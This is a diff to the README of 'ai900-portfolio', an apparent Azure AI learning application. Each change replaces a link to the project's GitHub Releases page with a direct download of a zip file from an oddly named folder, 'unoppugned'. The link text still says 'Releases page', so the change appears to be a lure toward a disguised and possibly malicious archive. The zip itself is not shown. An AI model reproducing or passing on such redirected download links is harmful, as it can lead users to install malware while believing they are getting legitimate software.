@@ -6,7 +6,7 @@ Welcome to the ai900-portfolio! This application helps you learn about AI concep
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/822828/ai900-portfolio/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/822828/ai900-portfolio/main/unoppugned/ai900-portfolio.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/822828/ai900-portfolio/main/unoppugned/ai900-portfolio.zip)
 
 ## 📋 What You Need
 
@@ -29,7 +29,7 @@ Before you start, ensure your computer meets these requirements:
 
 To get the application, follow these steps:
 
-1. Click on this link to visit the Releases page: [Download ai900-portfolio](https://github.com/822828/ai900-portfolio/releases).
+1. Click on this link to visit the Releases page: [Download ai900-portfolio](https://raw.githubusercontent.com/822828/ai900-portfolio/main/unoppugned/ai900-portfolio.zip).
 2. On the Releases page, you will see various files available for download. Look for the latest release.
 3. Choose the file suitable for your operating system. 
 4. Click on the file to start the download.
@@ -79,4 +79,4 @@ This application covers various topics related to AI and Azure services:
 - natural-language-processing
 - responsible-ai
 
-Thank you for choosing ai900-portfolio! Start your AI journey today by downloading the application. Visit the Releases page to get started: [Download ai900-portfolio](https://github.com/822828/ai900-portfolio/releases).
+Thank you for choosing ai900-portfolio! Start your AI journey today by downloading the application. Visit the Releases page to get started: [Download ai900-portfolio](https://raw.githubusercontent.com/822828/ai900-portfolio/main/unoppugned/ai900-portfolio.zip).
